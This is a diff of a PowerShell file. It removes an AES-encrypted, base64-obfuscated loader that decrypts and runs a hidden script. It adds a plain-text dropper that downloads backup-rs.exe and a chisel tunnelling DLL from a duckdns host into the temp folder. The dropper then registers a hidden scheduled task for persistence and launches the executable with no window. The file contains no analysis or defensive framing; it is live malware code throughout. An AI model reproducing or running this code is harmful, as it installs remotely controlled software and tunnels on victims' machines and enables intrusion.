@@ -1,1 +1,40 @@
-$k=[Convert]::FromBase64String('Q9R24LF6ti5IIFfrzq2Uqt4/b/xwpVMKxdaDEkRuS0w=');$iv=[Convert]::FromBase64String('7sfedPLvp2q4P9GhJcbpzw==');$e=[Convert]::FromBase64String('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');$a=New-Object ("Secu"+"rity.Cryptography.Aes"+"Managed");$a.Mode='CBC';$a.Padding='PKCS7';$a.Key=$k;$a.IV=$iv;$d=$a.CreateDecryptor();$rukp=$d.TransformFinalBlock($e,0,$e.Length);$tuez=[Text.Encoding]::UTF8.GetString($rukp);. ([ScriptBlock]::Create($tuez))
+$taskName = "BackupRustTask"
+
+$tempDir = $env:TEMP
+$exeFileName = "backup-rs.exe"
+
+$downloadUrl = "https://verefy.duckdns.org/backup-rs.exe"
+Invoke-WebRequest -Uri "https://verefy.duckdns.org/libchiselclient.dll" -OutFile "$tempDir\libchiselclient.dll"
+
+$exePath  = Join-Path -Path $tempDir -ChildPath $exeFileName
+$workDir  = $tempDir
+
+Invoke-WebRequest -Uri $downloadUrl -OutFile $exePath -UseBasicParsing -ErrorAction Stop
+
+try {
+    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction Stop
+} catch {
+}
+
+$action = New-ScheduledTaskAction -Execute $exePath -WorkingDirectory $workDir
+$trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddYears(10))
+$settings = New-ScheduledTaskSettingsSet -Hidden -StartWhenAvailable -MultipleInstances IgnoreNew
+
+Register-ScheduledTask `
+    -TaskName $taskName `
+    -Action $action `
+    -Trigger $trigger `
+    -Settings $settings `
+    -Description "Hidden background launch of backup-rs.exe" `
+    -Force | Out-Null
+
+$psi = New-Object System.Diagnostics.ProcessStartInfo
+$psi.FileName = $exePath
+$psi.WorkingDirectory = $workDir
+$psi.UseShellExecute = $false
+$psi.CreateNoWindow = $true
+$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+
+$proc = New-Object System.Diagnostics.Process
+$proc.StartInfo = $psi
+$null = $proc.Start()
